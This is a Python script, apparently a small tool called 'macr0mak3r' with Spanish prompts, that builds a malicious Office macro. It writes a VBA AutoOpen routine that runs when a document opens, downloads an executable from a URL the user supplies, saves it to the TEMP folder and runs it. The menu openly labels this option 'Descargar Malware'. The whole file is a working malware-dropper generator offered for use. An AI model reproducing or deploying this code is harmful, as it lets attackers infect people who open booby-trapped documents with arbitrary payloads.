def down():

    lec=macro_in_cache.replace("url_mgtols", rem)
    lec=lec.replace("archivo_mgtols", rem_2)

    escribe=open("macro.vb","w")
    escribe.write(lec)
    escribe.close()

    return "[MACRO] ===> MACRO.VB" 

    
macro_in_cache="""
Sub AutoOpen()
    Dim url As String
    Dim destino As String
    Dim objShell As Object
    
    ' URL del archivo a descargar
    url = "url_mgtols"
    
    ' Ruta donde guardar el archivo (temporal en este caso)
    destino = Environ("TEMP") & "\\archivo_mgtols"
    
    ' Crear objeto Shell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Descargar archivo
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    
    ' Guardar archivo y ejecutarlo si se descargo correctamente
    If http.Status = 200 Then
        Open destino For Binary As #1
        Put #1, , http.responseBody
        Close #1
        objShell.Run destino
        Set objShell = Nothing
    Else
        Set objShell = Nothing
    End If
    
End Sub
"""


try:
    
    selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

    while selec <= 0 or selec > 3:
        selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

except:
    pass

else:

    if selec == 1:

        try:
            rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")
            
            while len(rem) == 0:
                rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")

            rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")

            while len(rem_2) == 0:
                rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")


        except:
            pass
        else:
            try:
                print(down())
            except:
                print("[ERROR] ALGO SALIO MAL")
                pass
    
    if selec == 2:
        print("[OPTION] EN DESARROLLO")